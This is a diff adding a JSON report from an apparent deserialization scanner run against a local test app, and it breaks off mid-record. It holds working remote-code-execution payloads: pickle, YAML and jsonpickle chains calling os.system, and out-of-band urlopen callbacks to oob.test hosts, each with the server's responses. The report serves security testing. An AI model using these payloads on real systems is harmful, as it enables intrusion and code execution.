@@ -1,0 +1,1043 @@
+{
+    "target": "localhost:8083",
+    "disclaimer": "All findings are Suspected — the tool flags candidates and never auto-confirms; verify each manually.",
+    "stats": {
+        "vectors_scanned": 16,
+        "after_filter": 10,
+        "findings": 10,
+        "dynamic_strong": 6,
+        "oob": {
+            "status": "ran",
+            "collector": "http://172.27.32.1:9000",
+            "base_domain": "oob.test",
+            "tokens_polled": 10,
+            "confirmed": 6
+        }
+    },
+    "findings": [
+        {
+            "url": "http://localhost:8083/api/dashboard",
+            "method": "GET",
+            "location": "cookie",
+            "name": "session",
+            "occurrences": 1,
+            "oob_token": "76c4a7a75714",
+            "type": "Python Pickle",
+            "subtype": null,
+            "confidence": "High",
+            "exploit_type": "Python Pickle RCE",
+            "suggested_probe": "pickle_exec",
+            "severity": "Critical",
+            "severity_note": "raised from High — OOB callback on a token carried only by command/code-execution canaries (pickle_oob) — suspected RCE",
+            "evidence": "dynamic-strong",
+            "notes": "pickle.loads() from untrusted source = RCE by design | No gadget chain needed — __reduce__ enables arbitrary code execution | No explicit RCE pattern in payload text | Binary pickle opcodes may still contain RCE — inspect with pickletools",
+            "normalized": [
+                "\u00048\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0006models\u0004User)}(\busername\u0006wiener\u0005adminub."
+            ],
+            "mutations_count": 4,
+            "indicators": [
+                "OOB callback received (2 hit(s)) on token 76c4a7a75714 — out-of-band interaction observed: the payload was deserialized and triggered an outbound lookup/request (suspected; verify manually — a callback does not by itself prove arbitrary code execution)",
+                "Observation: response length changed by +1 bytes (baseline=256 mutated=257, same status 200) — possible behavioral change, verify manually",
+                "Response content differs in a small, localized way despite same status (similarity=0.98) (baseline='{\"admin\":false,\"notifications\":[{\"text\":\"Welcome to Acme Portal (Python edition).\",\"time\":\"2 hours ago\"},{\"text\":\"Your preferences backup completed.\",\"time\":\"yesterday\"},{\"text\":\"New sign-in from a kn' mutated='{\"admin\":false,\"notifications\":[{\"text\":\"Welcome to Acme Portal (Python edition).\",\"time\":\"2 hours ago\"},{\"text\":\"Your preferences backup completed.\",\"time\":\"yesterday\"},{\"text\":\"New sign-in from a kn')"
+            ],
+            "attempts": [
+                {
+                    "payload_type": "pickle_rce",
+                    "chain": "os.system via __reduce__",
+                    "payload": "gAWVHQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAJpZJSFlFKULg==",
+                    "signal": "strong",
+                    "indicators": [
+                        "Observation: response length changed by +1 bytes (baseline=256 mutated=257, same status 200) — possible behavioral change, verify manually",
+                        "Response content differs in a small, localized way despite same status (similarity=0.98) (baseline='{\"admin\":false,\"notifications\":[{\"text\":\"Welcome to Acme Portal (Python edition).\",\"time\":\"2 hours ago\"},{\"text\":\"Your preferences backup completed.\",\"time\":\"yesterday\"},{\"text\":\"New sign-in from a kn' mutated='{\"admin\":false,\"notifications\":[{\"text\":\"Welcome to Acme Portal (Python edition).\",\"time\":\"2 hours ago\"},{\"text\":\"Your preferences backup completed.\",\"time\":\"yesterday\"},{\"text\":\"New sign-in from a kn')"
+                    ],
+                    "baseline": {
+                        "status": 200,
+                        "length": 256,
+                        "body_sample": "{\"admin\":false,\"notifications\":[{\"text\":\"Welcome to Acme Portal (Python edition).\",\"time\":\"2 hours ago\"},{\"text\":\"Your preferences backup completed.\",\"time\":\"yesterday\"},{\"text\":\"New sign-in from a known device.\",\"time\":\"3 days ago\"}],\"username\":\"wiener\"}\n"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 257,
+                        "body_sample": "{\"admin\":false,\"notifications\":[{\"text\":\"Welcome to Acme Portal (Python edition).\",\"time\":\"2 hours ago\"},{\"text\":\"Your preferences backup completed.\",\"time\":\"yesterday\"},{\"text\":\"New sign-in from a known device.\",\"time\":\"3 days ago\"}],\"username\":\"unknown\"}\n"
+                    }
+                },
+                {
+                    "payload_type": "pickle_rce",
+                    "chain": "os.system via __reduce__",
+                    "payload": "gAWVIQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAZ3aG9hbWmUhZRSlC4=",
+                    "signal": "strong",
+                    "indicators": [
+                        "Observation: response length changed by +1 bytes (baseline=256 mutated=257, same status 200) — possible behavioral change, verify manually",
+                        "Response content differs in a small, localized way despite same status (similarity=0.98) (baseline='{\"admin\":false,\"notifications\":[{\"text\":\"Welcome to Acme Portal (Python edition).\",\"time\":\"2 hours ago\"},{\"text\":\"Your preferences backup completed.\",\"time\":\"yesterday\"},{\"text\":\"New sign-in from a kn' mutated='{\"admin\":false,\"notifications\":[{\"text\":\"Welcome to Acme Portal (Python edition).\",\"time\":\"2 hours ago\"},{\"text\":\"Your preferences backup completed.\",\"time\":\"yesterday\"},{\"text\":\"New sign-in from a kn')"
+                    ],
+                    "baseline": {
+                        "status": 200,
+                        "length": 256,
+                        "body_sample": "{\"admin\":false,\"notifications\":[{\"text\":\"Welcome to Acme Portal (Python edition).\",\"time\":\"2 hours ago\"},{\"text\":\"Your preferences backup completed.\",\"time\":\"yesterday\"},{\"text\":\"New sign-in from a known device.\",\"time\":\"3 days ago\"}],\"username\":\"wiener\"}\n"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 257,
+                        "body_sample": "{\"admin\":false,\"notifications\":[{\"text\":\"Welcome to Acme Portal (Python edition).\",\"time\":\"2 hours ago\"},{\"text\":\"Your preferences backup completed.\",\"time\":\"yesterday\"},{\"text\":\"New sign-in from a known device.\",\"time\":\"3 days ago\"}],\"username\":\"unknown\"}\n"
+                    }
+                },
+                {
+                    "payload_type": "pickle_rce",
+                    "chain": "os.system via __reduce__",
+                    "payload": "gAWVIwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAhob3N0bmFtZZSFlFKULg==",
+                    "signal": "strong",
+                    "indicators": [
+                        "Observation: response length changed by +1 bytes (baseline=256 mutated=257, same status 200) — possible behavioral change, verify manually",
+                        "Response content differs in a small, localized way despite same status (similarity=0.98) (baseline='{\"admin\":false,\"notifications\":[{\"text\":\"Welcome to Acme Portal (Python edition).\",\"time\":\"2 hours ago\"},{\"text\":\"Your preferences backup completed.\",\"time\":\"yesterday\"},{\"text\":\"New sign-in from a kn' mutated='{\"admin\":false,\"notifications\":[{\"text\":\"Welcome to Acme Portal (Python edition).\",\"time\":\"2 hours ago\"},{\"text\":\"Your preferences backup completed.\",\"time\":\"yesterday\"},{\"text\":\"New sign-in from a kn')"
+                    ],
+                    "baseline": {
+                        "status": 200,
+                        "length": 256,
+                        "body_sample": "{\"admin\":false,\"notifications\":[{\"text\":\"Welcome to Acme Portal (Python edition).\",\"time\":\"2 hours ago\"},{\"text\":\"Your preferences backup completed.\",\"time\":\"yesterday\"},{\"text\":\"New sign-in from a known device.\",\"time\":\"3 days ago\"}],\"username\":\"wiener\"}\n"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 257,
+                        "body_sample": "{\"admin\":false,\"notifications\":[{\"text\":\"Welcome to Acme Portal (Python edition).\",\"time\":\"2 hours ago\"},{\"text\":\"Your preferences backup completed.\",\"time\":\"yesterday\"},{\"text\":\"New sign-in from a known device.\",\"time\":\"3 days ago\"}],\"username\":\"unknown\"}\n"
+                    }
+                },
+                {
+                    "payload_type": "pickle_oob",
+                    "chain": "urllib.urlopen via __reduce__",
+                    "payload": "gAWVQgAAAAAAAACMDnVybGxpYi5yZXF1ZXN0lIwHdXJsb3BlbpSTlIwdaHR0cDovLzc2YzRhN2E3NTcxNC5vb2IudGVzdC+UhZRSlC4=",
+                    "signal": "strong",
+                    "indicators": [
+                        "Status code changed: baseline=200 mutated=500",
+                        "Response length changed significantly: baseline=256 mutated=109"
+                    ],
+                    "baseline": {
+                        "status": 200,
+                        "length": 256,
+                        "body_sample": "{\"admin\":false,\"notifications\":[{\"text\":\"Welcome to Acme Portal (Python edition).\",\"time\":\"2 hours ago\"},{\"text\":\"Your preferences backup completed.\",\"time\":\"yesterday\"},{\"text\":\"New sign-in from a known device.\",\"time\":\"3 days ago\"}],\"username\":\"wiener\"}\n"
+                    },
+                    "mutated": {
+                        "status": 500,
+                        "length": 109,
+                        "body_sample": "{\"error\":\"failed to deserialize session via pickle.loads(): <urlopen error [Errno 111] Connection refused>\"}\n"
+                    }
+                }
+            ],
+            "oob_confirmed": true
+        },
+        {
+            "url": "http://localhost:8083/api/profile",
+            "method": "GET",
+            "location": "cookie",
+            "name": "session",
+            "occurrences": 1,
+            "oob_token": "344d81a67335",
+            "type": "Python Pickle",
+            "subtype": null,
+            "confidence": "High",
+            "exploit_type": "Python Pickle RCE",
+            "suggested_probe": "pickle_exec",
+            "severity": "Critical",
+            "severity_note": "raised from High — OOB callback on a token carried only by command/code-execution canaries (pickle_oob) — suspected RCE",
+            "evidence": "dynamic-strong",
+            "notes": "pickle.loads() from untrusted source = RCE by design | No gadget chain needed — __reduce__ enables arbitrary code execution | No explicit RCE pattern in payload text | Binary pickle opcodes may still contain RCE — inspect with pickletools",
+            "normalized": [
+                "\u00048\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0006models\u0004User)}(\busername\u0006wiener\u0005adminub."
+            ],
+            "mutations_count": 4,
+            "indicators": [
+                "OOB callback received (2 hit(s)) on token 344d81a67335 — out-of-band interaction observed: the payload was deserialized and triggered an outbound lookup/request (suspected; verify manually — a callback does not by itself prove arbitrary code execution)",
+                "Observation: response length changed by +2 bytes (baseline=92 mutated=94, same status 200) — possible behavioral change, verify manually",
+                "Response content differs in a small, localized way despite same status (similarity=0.90) (baseline='{\"admin\":false,\"email\":\"wiener@acme-portal.test\",\"joined\":\"2025-01-15\",\"username\":\"wiener\"}\\n' mutated='{\"admin\":false,\"email\":\"unknown@acme-portal.test\",\"joined\":\"2025-01-15\",\"username\":\"unknown\"}\\n')"
+            ],
+            "attempts": [
+                {
+                    "payload_type": "pickle_rce",
+                    "chain": "os.system via __reduce__",
+                    "payload": "gAWVHQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAJpZJSFlFKULg==",
+                    "signal": "strong",
+                    "indicators": [
+                        "Observation: response length changed by +2 bytes (baseline=92 mutated=94, same status 200) — possible behavioral change, verify manually",
+                        "Response content differs in a small, localized way despite same status (similarity=0.90) (baseline='{\"admin\":false,\"email\":\"wiener@acme-portal.test\",\"joined\":\"2025-01-15\",\"username\":\"wiener\"}\\n' mutated='{\"admin\":false,\"email\":\"unknown@acme-portal.test\",\"joined\":\"2025-01-15\",\"username\":\"unknown\"}\\n')"
+                    ],
+                    "baseline": {
+                        "status": 200,
+                        "length": 92,
+                        "body_sample": "{\"admin\":false,\"email\":\"wiener@acme-portal.test\",\"joined\":\"2025-01-15\",\"username\":\"wiener\"}\n"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 94,
+                        "body_sample": "{\"admin\":false,\"email\":\"unknown@acme-portal.test\",\"joined\":\"2025-01-15\",\"username\":\"unknown\"}\n"
+                    }
+                },
+                {
+                    "payload_type": "pickle_rce",
+                    "chain": "os.system via __reduce__",
+                    "payload": "gAWVIQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAZ3aG9hbWmUhZRSlC4=",
+                    "signal": "strong",
+                    "indicators": [
+                        "Observation: response length changed by +2 bytes (baseline=92 mutated=94, same status 200) — possible behavioral change, verify manually",
+                        "Response content differs in a small, localized way despite same status (similarity=0.90) (baseline='{\"admin\":false,\"email\":\"wiener@acme-portal.test\",\"joined\":\"2025-01-15\",\"username\":\"wiener\"}\\n' mutated='{\"admin\":false,\"email\":\"unknown@acme-portal.test\",\"joined\":\"2025-01-15\",\"username\":\"unknown\"}\\n')"
+                    ],
+                    "baseline": {
+                        "status": 200,
+                        "length": 92,
+                        "body_sample": "{\"admin\":false,\"email\":\"wiener@acme-portal.test\",\"joined\":\"2025-01-15\",\"username\":\"wiener\"}\n"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 94,
+                        "body_sample": "{\"admin\":false,\"email\":\"unknown@acme-portal.test\",\"joined\":\"2025-01-15\",\"username\":\"unknown\"}\n"
+                    }
+                },
+                {
+                    "payload_type": "pickle_rce",
+                    "chain": "os.system via __reduce__",
+                    "payload": "gAWVIwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAhob3N0bmFtZZSFlFKULg==",
+                    "signal": "strong",
+                    "indicators": [
+                        "Observation: response length changed by +2 bytes (baseline=92 mutated=94, same status 200) — possible behavioral change, verify manually",
+                        "Response content differs in a small, localized way despite same status (similarity=0.90) (baseline='{\"admin\":false,\"email\":\"wiener@acme-portal.test\",\"joined\":\"2025-01-15\",\"username\":\"wiener\"}\\n' mutated='{\"admin\":false,\"email\":\"unknown@acme-portal.test\",\"joined\":\"2025-01-15\",\"username\":\"unknown\"}\\n')"
+                    ],
+                    "baseline": {
+                        "status": 200,
+                        "length": 92,
+                        "body_sample": "{\"admin\":false,\"email\":\"wiener@acme-portal.test\",\"joined\":\"2025-01-15\",\"username\":\"wiener\"}\n"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 94,
+                        "body_sample": "{\"admin\":false,\"email\":\"unknown@acme-portal.test\",\"joined\":\"2025-01-15\",\"username\":\"unknown\"}\n"
+                    }
+                },
+                {
+                    "payload_type": "pickle_oob",
+                    "chain": "urllib.urlopen via __reduce__",
+                    "payload": "gAWVQgAAAAAAAACMDnVybGxpYi5yZXF1ZXN0lIwHdXJsb3BlbpSTlIwdaHR0cDovLzM0NGQ4MWE2NzMzNS5vb2IudGVzdC+UhZRSlC4=",
+                    "signal": "strong",
+                    "indicators": [
+                        "Status code changed: baseline=200 mutated=500"
+                    ],
+                    "baseline": {
+                        "status": 200,
+                        "length": 92,
+                        "body_sample": "{\"admin\":false,\"email\":\"wiener@acme-portal.test\",\"joined\":\"2025-01-15\",\"username\":\"wiener\"}\n"
+                    },
+                    "mutated": {
+                        "status": 500,
+                        "length": 109,
+                        "body_sample": "{\"error\":\"failed to deserialize session via pickle.loads(): <urlopen error [Errno 111] Connection refused>\"}\n"
+                    }
+                }
+            ],
+            "oob_confirmed": true
+        },
+        {
+            "url": "http://localhost:8083/api/import",
+            "method": "POST",
+            "location": "raw_body",
+            "name": "payload",
+            "occurrences": 1,
+            "oob_token": "5b736d0b1377",
+            "type": "Python Pickle",
+            "subtype": null,
+            "confidence": "High",
+            "exploit_type": "Python Pickle RCE",
+            "suggested_probe": "pickle_exec",
+            "severity": "Critical",
+            "severity_note": "raised from High — OOB callback on a token carried only by command/code-execution canaries (pickle_oob) — suspected RCE",
+            "evidence": "dynamic-strong",
+            "notes": "pickle.loads() from untrusted source = RCE by design | No gadget chain needed — __reduce__ enables arbitrary code execution | No explicit RCE pattern in payload text | Binary pickle opcodes may still contain RCE — inspect with pickletools",
+            "normalized": [
+                "\u0005 \u0000\u0000\u0000\u0000\u0000\u0000\u0000}(\u0005theme\u0004dark\u0004lang\u0002enu."
+            ],
+            "mutations_count": 4,
+            "indicators": [
+                "OOB callback received (2 hit(s)) on token 5b736d0b1377 — out-of-band interaction observed: the payload was deserialized and triggered an outbound lookup/request (suspected; verify manually — a callback does not by itself prove arbitrary code execution)",
+                "Status code changed: baseline=200 mutated=500",
+                "Response length changed significantly: baseline=62 mutated=109"
+            ],
+            "attempts": [
+                {
+                    "payload_type": "pickle_rce",
+                    "chain": "os.system via __reduce__",
+                    "payload": "gAWVHQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAJpZJSFlFKULg==",
+                    "signal": "weak",
+                    "indicators": [
+                        "Observation: response length changed by -30 bytes (baseline=62 mutated=32, same status 200) — possible behavioral change, verify manually"
+                    ],
+                    "baseline": {
+                        "status": 200,
+                        "length": 62,
+                        "body_sample": "{\"restored\":\"{'theme': 'dark', 'lang': 'en'}\",\"success\":true}\n"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 32,
+                        "body_sample": "{\"restored\":\"0\",\"success\":true}\n"
+                    }
+                },
+                {
+                    "payload_type": "pickle_rce",
+                    "chain": "os.system via __reduce__",
+                    "payload": "gAWVIQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAZ3aG9hbWmUhZRSlC4=",
+                    "signal": "weak",
+                    "indicators": [
+                        "Observation: response length changed by -30 bytes (baseline=62 mutated=32, same status 200) — possible behavioral change, verify manually"
+                    ],
+                    "baseline": {
+                        "status": 200,
+                        "length": 62,
+                        "body_sample": "{\"restored\":\"{'theme': 'dark', 'lang': 'en'}\",\"success\":true}\n"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 32,
+                        "body_sample": "{\"restored\":\"0\",\"success\":true}\n"
+                    }
+                },
+                {
+                    "payload_type": "pickle_rce",
+                    "chain": "os.system via __reduce__",
+                    "payload": "gAWVIwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAhob3N0bmFtZZSFlFKULg==",
+                    "signal": "weak",
+                    "indicators": [
+                        "Observation: response length changed by -30 bytes (baseline=62 mutated=32, same status 200) — possible behavioral change, verify manually"
+                    ],
+                    "baseline": {
+                        "status": 200,
+                        "length": 62,
+                        "body_sample": "{\"restored\":\"{'theme': 'dark', 'lang': 'en'}\",\"success\":true}\n"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 32,
+                        "body_sample": "{\"restored\":\"0\",\"success\":true}\n"
+                    }
+                },
+                {
+                    "payload_type": "pickle_oob",
+                    "chain": "urllib.urlopen via __reduce__",
+                    "payload": "gAWVQgAAAAAAAACMDnVybGxpYi5yZXF1ZXN0lIwHdXJsb3BlbpSTlIwdaHR0cDovLzViNzM2ZDBiMTM3Ny5vb2IudGVzdC+UhZRSlC4=",
+                    "signal": "strong",
+                    "indicators": [
+                        "Status code changed: baseline=200 mutated=500",
+                        "Response length changed significantly: baseline=62 mutated=109"
+                    ],
+                    "baseline": {
+                        "status": 200,
+                        "length": 62,
+                        "body_sample": "{\"restored\":\"{'theme': 'dark', 'lang': 'en'}\",\"success\":true}\n"
+                    },
+                    "mutated": {
+                        "status": 500,
+                        "length": 109,
+                        "body_sample": "{\"error\":\"failed to restore preferences via pickle.loads(): <urlopen error [Errno 111] Connection refused>\"}\n"
+                    }
+                }
+            ],
+            "oob_confirmed": true
+        },
+        {
+            "url": "http://localhost:8083/api/import-config",
+            "method": "POST",
+            "location": "raw_body",
+            "name": "payload",
+            "occurrences": 1,
+            "oob_token": "ca4ed810bb3c",
+            "type": "YAML",
+            "subtype": "YAML Python Object Injection",
+            "confidence": "Medium",
+            "exploit_type": "YAML Python Object",
+            "suggested_probe": "yaml_exec",
+            "severity": "Critical",
+            "severity_note": "raised from High — OOB callback on a token carried only by command/code-execution canaries (yaml_oob) — suspected RCE",
+            "evidence": "dynamic-strong",
+            "notes": "Matched: YAML Python Object (pattern: !!python/object\\s*:) | Vulnerable only with an unsafe loader (yaml.load / YAML.unsafe_load / Psych object mode), not a safe_load",
+            "normalized": [
+                "!!python/object:models.Settings {theme: dark, lang: en}"
+            ],
+            "mutations_count": 4,
+            "indicators": [
+                "OOB callback received (2 hit(s)) on token ca4ed810bb3c — out-of-band interaction observed: the payload was deserialized and triggered an outbound lookup/request (suspected; verify manually — a callback does not by itself prove arbitrary code execution)",
+                "Response length changed significantly: baseline=71 mutated=30"
+            ],
+            "attempts": [
+                {
+                    "payload_type": "yaml_rce",
+                    "chain": "python/object/apply:os.system",
+                    "payload": "!!python/object/apply:os.system\nargs: ['id']",
+                    "signal": "strong",
+                    "indicators": [
+                        "Response length changed significantly: baseline=71 mutated=30"
+                    ],
+                    "baseline": {
+                        "status": 200,
+                        "length": 71,
+                        "body_sample": "{\"config\":\"<models.Settings object at 0x72ff9226e290>\",\"success\":true}\n"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 30,
+                        "body_sample": "{\"config\":\"0\",\"success\":true}\n"
+                    }
+                },
+                {
+                    "payload_type": "yaml_rce",
+                    "chain": "python/object/apply:os.system",
+                    "payload": "!!python/object/apply:os.system\nargs: ['whoami']",
+                    "signal": "strong",
+                    "indicators": [
+                        "Response length changed significantly: baseline=71 mutated=30"
+                    ],
+                    "baseline": {
+                        "status": 200,
+                        "length": 71,
+                        "body_sample": "{\"config\":\"<models.Settings object at 0x72ff9226ec10>\",\"success\":true}\n"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 30,
+                        "body_sample": "{\"config\":\"0\",\"success\":true}\n"
+                    }
+                },
+                {
+                    "payload_type": "yaml_rce",
+                    "chain": "python/object/apply:os.system",
+                    "payload": "!!python/object/apply:os.system\nargs: ['hostname']",
+                    "signal": "strong",
+                    "indicators": [
+                        "Response length changed significantly: baseline=71 mutated=30"
+                    ],
+                    "baseline": {
+                        "status": 200,
+                        "length": 71,
+                        "body_sample": "{\"config\":\"<models.Settings object at 0x72ff9226e590>\",\"success\":true}\n"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 30,
+                        "body_sample": "{\"config\":\"0\",\"success\":true}\n"
+                    }
+                },
+                {
+                    "payload_type": "yaml_oob",
+                    "chain": "python/object/apply:urllib.request.urlopen",
+                    "payload": "!!python/object/apply:urllib.request.urlopen\nargs: ['http://ca4ed810bb3c.oob.test/']",
+                    "signal": "strong",
+                    "indicators": [
+                        "Status code changed: baseline=200 mutated=500"
+                    ],
+                    "baseline": {
+                        "status": 200,
+                        "length": 71,
+                        "body_sample": "{\"config\":\"<models.Settings object at 0x72ff9226e5d0>\",\"success\":true}\n"
+                    },
+                    "mutated": {
+                        "status": 500,
+                        "length": 98,
+                        "body_sample": "{\"error\":\"failed to load config via yaml.load(): <urlopen error [Errno 111] Connection refused>\"}\n"
+                    }
+                }
+            ],
+            "oob_confirmed": true
+        },
+        {
+            "url": "http://localhost:8083/api/restore-prefs",
+            "method": "POST",
+            "location": "raw_body",
+            "name": "payload",
+            "occurrences": 1,
+            "oob_token": "b876852b011e",
+            "type": "Python Pickle",
+            "subtype": "jsonpickle Object Injection",
+            "confidence": "Medium",
+            "exploit_type": "jsonpickle Object Injection RCE",
+            "suggested_probe": "jsonpickle_exec",
+            "severity": "Critical",
+            "severity_note": null,
+            "evidence": "dynamic-strong",
+            "notes": "jsonpickle.decode() reconstructs objects from JSON py/reduce/py/object | RCE via JSON payload — no binary pickle needed",
+            "normalized": [
+                "{\"py/object\": \"models.Preferences\", \"theme\": \"dark\", \"lang\": \"en\"}"
+            ],
+            "mutations_count": 4,
+            "indicators": [
+                "OOB callback received (2 hit(s)) on token b876852b011e — out-of-band interaction observed: the payload was deserialized and triggered an outbound lookup/request (suspected; verify manually — a callback does not by itself prove arbitrary code execution)",
+                "Response length changed significantly: baseline=76 mutated=32"
+            ],
+            "attempts": [
+                {
+                    "payload_type": "jsonpickle_rce",
+                    "chain": "py/reduce:os.system",
+                    "payload": "{\"py/reduce\": [{\"py/function\": \"os.system\"}, {\"py/tuple\": [\"id\"]}]}",
+                    "signal": "strong",
+                    "indicators": [
+                        "Response length changed significantly: baseline=76 mutated=32"
+                    ],
+                    "baseline": {
+                        "status": 200,
+                        "length": 76,
+                        "body_sample": "{\"restored\":\"<models.Preferences object at 0x72ff9226e350>\",\"success\":true}\n"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 32,
+                        "body_sample": "{\"restored\":\"0\",\"success\":true}\n"
+                    }
+                },
+                {
+                    "payload_type": "jsonpickle_rce",
+                    "chain": "py/reduce:os.system",
+                    "payload": "{\"py/reduce\": [{\"py/function\": \"os.system\"}, {\"py/tuple\": [\"whoami\"]}]}",
+                    "signal": "strong",
+                    "indicators": [
+                        "Response length changed significantly: baseline=76 mutated=32"
+                    ],
+                    "baseline": {
+                        "status": 200,
+                        "length": 76,
+                        "body_sample": "{\"restored\":\"<models.Preferences object at 0x72ff9226f790>\",\"success\":true}\n"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 32,
+                        "body_sample": "{\"restored\":\"0\",\"success\":true}\n"
+                    }
+                },
+                {
+                    "payload_type": "jsonpickle_rce",
+                    "chain": "py/reduce:os.system",
+                    "payload": "{\"py/reduce\": [{\"py/function\": \"os.system\"}, {\"py/tuple\": [\"hostname\"]}]}",
+                    "signal": "strong",
+                    "indicators": [
+                        "Response length changed significantly: baseline=76 mutated=32"
+                    ],
+                    "baseline": {
+                        "status": 200,
+                        "length": 76,
+                        "body_sample": "{\"restored\":\"<models.Preferences object at 0x72ff9226fb50>\",\"success\":true}\n"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 32,
+                        "body_sample": "{\"restored\":\"0\",\"success\":true}\n"
+                    }
+                },
+                {
+                    "payload_type": "jsonpickle_oob",
+                    "chain": "py/reduce:urllib.urlopen",
+                    "payload": "{\"py/reduce\": [{\"py/function\": \"urllib.request.urlopen\"}, {\"py/tuple\": [\"http://b876852b011e.oob.test/\"]}]}",
+                    "signal": "strong",
+                    "indicators": [
+                        "Status code changed: baseline=200 mutated=500"
+                    ],
+                    "baseline": {
+                        "status": 200,
+                        "length": 76,
+                        "body_sample": "{\"restored\":\"<models.Preferences object at 0x72ff9226f950>\",\"success\":true}\n"
+                    },
+                    "mutated": {
+                        "status": 500,
+                        "length": 108,
+                        "body_sample": "{\"error\":\"failed to restore prefs via jsonpickle.decode(): <urlopen error [Errno 111] Connection refused>\"}\n"
+                    }
+                }
+            ],
+            "oob_confirmed": true
+        },
+        {
+            "url": "http://localhost:8083/api/import-async",
+            "method": "POST",
+            "location": "raw_body",
+            "name": "payload",
+            "occurrences": 1,
+            "oob_token": "55d79536aa34",
+            "type": "Python Pickle",
+            "subtype": null,
+            "confidence": "High",
+            "exploit_type": "Python Pickle RCE",
+            "suggested_probe": "pickle_exec",
+            "severity": "Critical",
+            "severity_note": "raised from High — OOB callback on a token carried only by command/code-execution canaries (pickle_oob) — suspected RCE",
+            "evidence": "dynamic-strong",
+            "notes": "pickle.loads() from untrusted source = RCE by design | No gadget chain needed — __reduce__ enables arbitrary code execution | No explicit RCE pattern in payload text | Binary pickle opcodes may still contain RCE — inspect with pickletools",
+            "normalized": [
+                "\u0005 \u0000\u0000\u0000\u0000\u0000\u0000\u0000}(\u0005theme\u0004dark\u0004lang\u0002enu."
+            ],
+            "mutations_count": 4,
+            "indicators": [
+                "OOB callback received (2 hit(s)) on token 55d79536aa34 — out-of-band interaction observed: the payload was deserialized and triggered an outbound lookup/request (suspected; verify manually — a callback does not by itself prove arbitrary code execution)"
+            ],
+            "attempts": [
+                {
+                    "payload_type": "pickle_rce",
+                    "chain": "os.system via __reduce__",
+                    "payload": "gAWVHQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAJpZJSFlFKULg==",
+                    "signal": "weak",
+                    "indicators": [],
+                    "baseline": {
+                        "status": 200,
+                        "length": 16,
+                        "body_sample": "{\"queued\":true}\n"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 16,
+                        "body_sample": "{\"queued\":true}\n"
+                    }
+                },
+                {
+                    "payload_type": "pickle_rce",
+                    "chain": "os.system via __reduce__",
+                    "payload": "gAWVIQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAZ3aG9hbWmUhZRSlC4=",
+                    "signal": "weak",
+                    "indicators": [],
+                    "baseline": {
+                        "status": 200,
+                        "length": 16,
+                        "body_sample": "{\"queued\":true}\n"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 16,
+                        "body_sample": "{\"queued\":true}\n"
+                    }
+                },
+                {
+                    "payload_type": "pickle_rce",
+                    "chain": "os.system via __reduce__",
+                    "payload": "gAWVIwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAhob3N0bmFtZZSFlFKULg==",
+                    "signal": "weak",
+                    "indicators": [],
+                    "baseline": {
+                        "status": 200,
+                        "length": 16,
+                        "body_sample": "{\"queued\":true}\n"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 16,
+                        "body_sample": "{\"queued\":true}\n"
+                    }
+                },
+                {
+                    "payload_type": "pickle_oob",
+                    "chain": "urllib.urlopen via __reduce__",
+                    "payload": "gAWVQgAAAAAAAACMDnVybGxpYi5yZXF1ZXN0lIwHdXJsb3BlbpSTlIwdaHR0cDovLzU1ZDc5NTM2YWEzNC5vb2IudGVzdC+UhZRSlC4=",
+                    "signal": "weak",
+                    "indicators": [],
+                    "baseline": {
+                        "status": 200,
+                        "length": 16,
+                        "body_sample": "{\"queued\":true}\n"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 16,
+                        "body_sample": "{\"queued\":true}\n"
+                    }
+                }
+            ],
+            "oob_confirmed": true
+        },
+        {
+            "url": "http://localhost:8083/api/import",
+            "method": "POST",
+            "location": "cookie",
+            "name": "session",
+            "occurrences": 1,
+            "oob_token": "0c0afe452538",
+            "type": "Python Pickle",
+            "subtype": null,
+            "confidence": "High",
+            "exploit_type": "Python Pickle RCE",
+            "suggested_probe": "pickle_exec",
+            "severity": "High",
+            "severity_note": null,
+            "evidence": "dynamic-weak",
+            "notes": "pickle.loads() from untrusted source = RCE by design | No gadget chain needed — __reduce__ enables arbitrary code execution | No explicit RCE pattern in payload text | Binary pickle opcodes may still contain RCE — inspect with pickletools",
+            "normalized": [
+                "\u00048\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0006models\u0004User)}(\busername\u0006wiener\u0005adminub."
+            ],
+            "mutations_count": 4,
+            "indicators": [],
+            "attempts": [
+                {
+                    "payload_type": "pickle_rce",
+                    "chain": "os.system via __reduce__",
+                    "payload": "gAWVHQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAJpZJSFlFKULg==",
+                    "signal": "weak",
+                    "indicators": [],
+                    "baseline": {
+                        "status": 200,
+                        "length": 62,
+                        "body_sample": "{\"restored\":\"{'theme': 'dark', 'lang': 'en'}\",\"success\":true}\n"
+                    },
+                    "mutated": {
